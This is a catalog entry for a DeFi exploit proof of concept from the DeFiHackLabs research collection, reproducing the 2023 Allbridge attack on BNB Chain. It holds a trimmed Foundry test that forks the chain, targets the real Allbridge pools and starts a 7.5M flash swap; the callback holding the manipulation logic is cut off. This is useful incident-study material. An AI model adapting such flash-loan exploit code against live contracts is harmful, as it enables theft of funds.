# [?] Allbridge_exp2 exploit (2023-04)

## Summary
Severity: Unknown
Chain: BNB Chain
Component: Allbridge_exp2
Published: 2023-04
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/Allbridge_exp2.sol
Type: defi-exploit-poc

## Details
References:
- https://twitter.com/peckshield/status/1642356701100916736
- https://twitter.com/BeosinAlert/status/1642372700726505473
- https://bscscan.com/tx/0x7ff1364c3b3b296b411965339ed956da5d17058f3164425ce800d64f1aef8210
- https://twitter.com/gbaleeeee/status/1642520517788966915

```solidity
contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IBridgeSwap BridgeSwap = IBridgeSwap(0x7E6c2522fEE4E74A0182B9C6159048361BC3260A);
    ISwap Swap = ISwap(0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0);
    AllBridgePool USDTPool = AllBridgePool(0xB19Cd6AB3890f18B662904fd7a40C003703d2554);
    AllBridgePool BUSDPool = AllBridgePool(0x179aaD597399B9ae078acFE2B746C09117799ca0);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 26_982_067);
        cheats.label(address(BUSD), "BUSD");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(BridgeSwap), "BridgeSwap");
        cheats.label(address(Swap), "Swap");
        cheats.label(address(USDTPool), "USDTPool");
        cheats.label(address(BUSDPool), "BUSDPool");
        cheats.label(address(Pair), "Pair");
    }

    function testExploit() public {
        Pair.swap(0, 7_500_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/Allbridge_exp2.sol_
